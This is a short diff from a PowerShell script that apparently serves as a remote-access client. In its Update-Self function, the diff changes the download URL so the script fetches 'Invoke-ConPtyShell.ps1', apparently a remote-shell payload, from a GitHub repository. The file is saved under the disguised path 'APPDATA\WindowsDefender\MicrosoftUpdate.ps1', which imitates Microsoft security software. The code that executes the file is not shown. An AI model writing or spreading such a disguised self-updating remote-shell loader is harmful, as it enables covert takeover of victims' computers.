@@ -560,7 +560,7 @@ function PortSuggest {
 
 function Update-Self {
     param (
-        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/client.ps1",
+        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1",
         [string]$localPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
     )
 
